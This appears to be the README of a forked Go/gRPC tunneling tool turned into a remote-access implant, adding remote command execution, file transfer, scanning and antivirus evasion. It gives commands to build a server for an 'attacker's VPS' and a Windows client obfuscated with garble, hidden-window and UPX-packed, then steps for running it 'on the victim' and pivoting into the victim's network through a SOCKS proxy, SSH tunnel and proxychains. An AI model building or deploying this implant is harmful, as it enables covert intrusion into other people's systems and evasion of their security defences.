# gTunnel Fork

Original:
> A TCP tunneling suite built with golang and gRPC. gTunnel can manage multiple forward and reverse tunnels that are all carried over a single TCP/HTTP2 connection. I wanted to learn a new language, so I picked go and gRPC. Client executables have been tested on windows and linux.

My changes + additions:
- Added gRPC tunnel for tasks (cmd exec / file transfer / file upload)
- High efficient TCP scanner
- Traffic stats
- AV evasion

# Dependencies
- [go 1.17+](https://golang.org/doc/install)
- [garble](https://github.com/burrowers/garble) used to obfuscate windows binaries

# Generate Server Binary

This is the binary to be used in the VPS

```bash
cd gServer
CGO_ENABLED=0 go build .
```

On the attacker's VPS, setup self-signed certs

```bash
mkdir tls && openssl req -new -newkey rsa:4096 -x509 -sha256 -days 365 -nodes -out tls/cert -subj "/C=/ST=/L=/O=/CN=" -keyout tls/key
```

# Generate Windows Client Binary

```bash
x=$PWD
serverPort=443
serverIP=8.8.8.8
outputFile=gClient.exe

seed=`cat /dev/urandom| head -1 | md5sum| base64`
cd gClient && GOROOT_FINAL=/dev/null GOOS=windows GOARCH=amd64 garble -seed=$seed -tiny -literals build -ldflags "-X main.serverAddress=$serverIP -X main.serverPort=$serverPort -s -w -H=windowsgui" -o gClient.exe && cp gClient.exe $x/$outputFile && upx $x/$outputFile
```

# How to setup a simple socks5 tunnel

1. Run `./gServer` on the attacker's VPS as root (with permissions to open 443/tcp)
2. Execute `gclient.exe` on the victim
3. Gain a new connection on the `gServer` prompt
4. Execute `use newMachine-0000`
5. Execute `socks 1080` to start a socks proxy on the victim machine
6. Execute `addtunnel local 1080 127.0.0.1 1080` - you will now have a socks5 proxy at 127.0.0.1:1080 on the attack VPS
7. Setup SSH tunnel from attackers actual machine to get access to the socks5 port on the VPS with `ssh -L 1080:127.0.0.1:1080 root@attack_vps -N -v`
8. Use `proxychains` with `127.0.0.1 1080` on the attacker's userland machine to interact with the victim's network
